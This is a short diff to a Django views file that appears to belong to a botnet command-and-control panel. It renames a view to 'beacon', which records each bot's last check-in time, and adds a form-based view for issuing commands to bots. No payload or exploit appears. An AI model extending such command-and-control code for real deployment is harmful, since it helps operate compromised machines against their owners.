@@ -1,6 +1,7 @@
 from django.shortcuts import render
 from django.views.decorators.csrf import csrf_exempt
-from .models import Bot
+from .models import Bot, Command
+from .forms import cmdForm
 import time, hashlib
 
 # Create your views here.
@@ -28,7 +29,7 @@ def reg(request):
 
 
 
-def cmd(request):
+def beacon(request):
     params = request.POST
     botId = params.get('botId', False)
     t = params.get('t', False)
@@ -39,6 +40,17 @@ def cmd(request):
             bot.lastSeen = t
             bot.save()
     return render(request, 'index.html')
+
+def cmd(request):
+    if request.method == 'POST':
+        form = cmdForm(request.POST)
+        if form.is_valid():
+            form.process()
+    else:
+        form = cmdForm()
+    return render(request, 'command.html', {'form' : form})
+
+
 
 
 def genTimeSeed():
